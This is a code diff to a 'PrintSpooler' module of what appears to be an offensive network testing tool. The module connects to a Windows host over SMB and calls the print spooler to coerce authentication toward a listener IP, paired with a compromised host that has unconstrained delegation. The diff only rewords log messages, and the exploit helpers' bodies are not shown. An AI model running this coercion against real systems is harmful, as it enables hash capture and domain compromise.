@@ -13,11 +13,11 @@ from utils.utils import gen_random_string, gen_bruteforce_creds
 
 class Module:
     name = 'PrintSpooler'
-    description = 'Check for host with PrintSpooler service enabled, use this with a compromised host with Uncontrained Delegation enabled !'
+    description = 'Check for host with PrintSpooler service enabled, use this with a compromised host with Uncontrained Delegation enabled ! [authenticated] (argument: IP for check and exploit)'
 
     def run(self, target, args, creds, timeout):
         if len(args) != 1:
-            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': 'PrintSpooler module requires 1 arg: -m printspooler <listener_ip>'})
+            Output.error({'target': 'smb://%s:%d' % (target['hostname'], target['port']), 'message': '[%s] Requires 1 arg: -m printspooler <listener_ip>' % self.name})
             return
 
         domain = creds['domain'] if 'domain' in creds else None
@@ -27,22 +27,24 @@ class Module:
         do_kerberos = creds['kerberos'] if 'kerberos' in creds else False
         dc_ip = creds['dc_ip'] if 'dc_ip' in creds else None
 
+        Output.minor({'target': 'smb://%s:%d' % (target['hostname'], 445), 'message': '[%s] Running module...' % self.name})
+
         check(target['hostname'], target['port'], args[0], domain, user, password, ntlm, do_kerberos, dc_ip, timeout)
 
 def check(ip, port, target_ip, domain, username, password, ntlm, do_kerberos, dc_ip, timeout):
     dce = create_connection(ip, domain, username, password, ntlm, do_kerberos, dc_ip)
     if dce == None:
-        Output.minor({'target': 'smb://%s:%d' % (ip, port), 'message': 'PrintSpooler failed: connection error'})
+        Output.minor({'target': 'smb://%s:%d' % (ip, port), 'message': '[PrintSpooler] Failure: connection error'})
         return
 
     handle = call_open_printer(dce, ip)
     if handle == None:
-        Output.minor({'target': 'smb://%s:%d' % (ip, port), 'message': 'PrintSpooler failed: failed to access printer service'})
+        Output.minor({'target': 'smb://%s:%d' % (ip, port), 'message': '[PrintSpooler] Failure: failed to access printer service'})
         return
 
     res = grab_hash(dce, handle, target_ip)
 
-    Output.highlight({'target': 'smb://%s:%d' % (ip, port), 'message': 'PrintSpooler executed, check your SMB service !'})
+    Output.highlight({'target': 'smb://%s:%d' % (ip, port), 'message': '[PrintSpooler] Success: check your SMB service !'})
     dce.disconnect()
 
 def create_connection(target, domain, username, password, ntlm, do_kerberos, dc_ip):
